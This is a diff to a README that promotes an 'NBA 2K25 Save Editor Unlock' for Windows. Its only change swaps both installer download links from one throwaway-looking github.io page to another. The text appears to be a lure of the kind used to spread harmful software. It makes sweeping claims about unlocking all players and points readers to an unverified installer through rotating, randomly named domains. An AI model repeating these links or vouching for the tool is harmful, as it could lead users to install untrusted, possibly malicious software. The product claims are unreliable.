@@ -2,7 +2,7 @@
 
 The NBA 2K25 Save Editor Unlock is a powerful tool designed for Windows desktop users to enhance their gaming experience. With this save editor, you can unlock all players, edit save files, and customize your NBA 2K25 gameplay effortlessly. Updated for 2026, it offers a seamless modding experience for both casual and hardcore players.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -68,4 +68,4 @@ The NBA 2K25 Save Editor Unlock is intended for educational and personal use onl
 
 ## Download
 
-Download the latest version from GitHub: [Get the NBA 2K25 Save Editor Unlock](https://yellowtaxisave.github.io/download-page/)
+Download the latest version from GitHub: [Get the NBA 2K25 Save Editor Unlock](https://capitals-707-bringing.github.io/download-page/)
